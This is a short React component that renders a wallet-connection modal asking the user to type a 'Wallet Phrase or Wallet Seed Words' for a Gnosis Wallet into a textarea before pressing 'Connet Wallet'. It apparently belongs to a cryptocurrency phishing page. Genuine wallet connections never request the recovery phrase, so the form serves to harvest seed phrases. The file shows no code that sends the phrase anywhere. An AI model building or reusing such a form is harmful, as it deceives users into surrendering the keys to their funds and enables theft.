import React from 'react';
import "./modali.css"
import "./main.css"

import image from '../image/image';
const Modali = ({classname, setClose}) => {
  
  return (
    <div  className={`bgcolor ${classname}`}  >

      <div  className="din">
       <div> <p className='phr'>Phrase</p>
       <img src={image.close} alt="close" className='close'   onClick={setClose} />
       </div>
        <p className='para'>Establish a connection for yourGnosis WalletWallet</p>
        <form className='input'>
         <textarea name="message" rows="10" cols="30" placeholder='Wallet Phrase or Wallet Seed Words'></textarea>
       </form>
       <p className='para'>Typically 12 (sometimes 24) words separated by single spaces</p>
       <button className='btno'>Connet Wallet</button>
      </div>
    </div>
  );
}

export default Modali;
